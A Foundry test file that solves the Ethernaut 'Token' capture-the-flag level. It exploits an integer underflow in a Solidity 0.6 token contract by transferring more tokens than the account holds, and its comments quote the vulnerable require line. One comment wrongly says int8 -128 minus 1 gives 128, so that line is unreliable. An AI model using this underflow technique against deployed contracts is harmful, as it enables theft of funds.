// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";

import "../src/Ethernaut.sol";
import "ethernaut/contracts/levels/TokenFactory.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract TokenExploit is DSTest {
	using SafeMath for uint256;

	Vm private vm = Vm(address(HEVM_ADDRESS));
	Ethernaut private ethernaut;
	address private eoaAddress = address(1337);

	function setUp() public {
		ethernaut = new Ethernaut();
		vm.deal(eoaAddress, 1 ether);
	}

	function testExploit() public {
		// Setting up the level
		TokenFactory factory = new TokenFactory();
		ethernaut.registerLevel(factory);
		vm.startPrank(eoaAddress);
		address levelAddress = ethernaut.createLevelInstance(factory);
		Token target = Token(payable(levelAddress));

		// TODO: Exploit the contract
		// This is an integer underflow problem.
		// Here's an example with int8 and uint8 integers.
		// uint8 min = 0; // min - 1 returns 255
		// uint8 max = 255; // max + 1 returns 0
		// int8 min = -128; // min - 1 returns 128
		// int8 max = 127; // max + 1 returns -128
		
		// In the Token contract, here's the vulnerable line of code:
		// require(balances[msg.sender] - _value >= 0)
		// We know that our balance is equal to 20 tokens and we also know that in Solidity 0.6.0,
		// underflows and overflows are possible if the SafeMath OpenZeppelin library is not used.
		// It has been patched from version 0.8 of solidity
		emit log_named_uint("Current balance", target.balanceOf(eoaAddress));
		target.transfer(address(0), 21);
		emit log_named_uint("New balance", target.balanceOf(eoaAddress));

		// Submit the solution
		bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
		vm.stopPrank();
		assert(levelSuccessfullyPassed);
	}
}
